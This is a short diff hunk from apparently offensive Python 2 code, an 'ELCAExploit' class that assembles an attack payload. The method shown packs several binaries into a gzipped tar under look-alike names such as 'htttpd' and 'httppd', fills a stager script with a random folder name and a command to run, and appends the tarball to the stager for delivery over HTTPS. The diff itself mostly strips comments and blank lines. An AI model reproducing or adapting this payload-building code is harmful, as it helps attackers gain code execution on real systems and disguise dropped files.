@@ -78,36 +78,26 @@ class ELCAExploit(HTTPSExploit):
         self.build_exploit_payload(cmd)
 
     def build_exploit_payload(self,cmd="/tmp/httpd"):
-        ##
-
         out = StringIO()
         tf = tarfile.open(mode="w:gz",fileobj=out)
-        ##
-
         tf.dereference = True
         try:
             tf.add(self.tinyexec,arcname='htttpd')
             tf.add(self.binpath,arcname='httpd')
             tf.add(self.setlog,arcname='httppd')
-            ##
-
+           
         except IOError, e:
             self.log.error("Couldn't find file. Ensure paths are correct and you have run make.")
             raise e
         tf.close()
         out.seek(0)
         tdata = out.read()
-
         self.folder = randstr(5)
         stager = ""
         for i,l in enumerate(open(self.stagerfn).readlines()):
             if i == 0 or not l.strip().startswith("#"):
                 stager+=l
-
-        ##
-
-        ##
-
+                
         flen = len(stager.format(rand=self.folder,flen=len(stager),cmd=cmd))
         self.payload = stager.format(rand=self.folder,flen=flen,cmd=cmd)
         self.payload +=  tdata
